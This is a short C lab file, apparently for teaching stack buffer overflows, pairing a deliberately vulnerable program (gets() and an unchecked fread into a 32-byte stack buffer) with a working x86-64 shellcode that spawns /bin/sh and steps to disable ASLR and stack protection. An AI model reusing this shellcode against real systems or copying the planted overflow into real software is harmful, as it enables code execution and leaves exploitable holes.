//echo 0 > /proc/sys/kernel/randomize_va_space
//gcc -fno-stack-protector -z execstack injectShellcode.c
//./a.out and input: shellcode.bin

//Make sure the content of shellcode.bin is like this:
char shellcode[] = "\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05\x00"//Shellcode here; add 0x00 for 64-bit (8-byte) alignment.
"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc" // RBP is here; no impact on shellcode.
"\x30\xe2\xff\xff\xff\x7f\x00\x00";// The return address is here and should be changed to the address of the shellcode (i.e., the address of the vulnerableBuffer array). Please update the value if the address on your machine is different.

//Input shellcode via the keyboard and update the address of the shellcode if necessary.
//echo -ne '\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05\x00\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\x30\xe2\xff\xff\xff\x7f\x00\x00' | ./a.out

#include <stdio.h>
#include <string.h>

int readFile(const char* path, unsigned char* vulnerableBuffer)
{
    FILE* file = fopen(path, "rb");
    if (file == NULL) {
        perror("Error opening file");
        return 1;
    }

    // Move to the end to get file size
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);// fileSize = 48, the vulnerableBuffer will overflow.
    rewind(file);  // Reset file pointer to beginning

    // The vulnerableBuffer overflows here
    if(fileSize != fread(vulnerableBuffer, 1, fileSize, file))
    {
        perror("Error fread");
    }
}

char fileName[32];
void vulnerableFunction()
{
    unsigned char vulnerableBuffer[32];
    printf("Load the file at: %p\nPlease enter your file name:", vulnerableBuffer);
    gets(fileName);
    readFile(fileName, vulnerableBuffer);
}// will run shellcode.bin here.

int main()
{
    vulnerableFunction();
    printf("Bye👋\n");
}
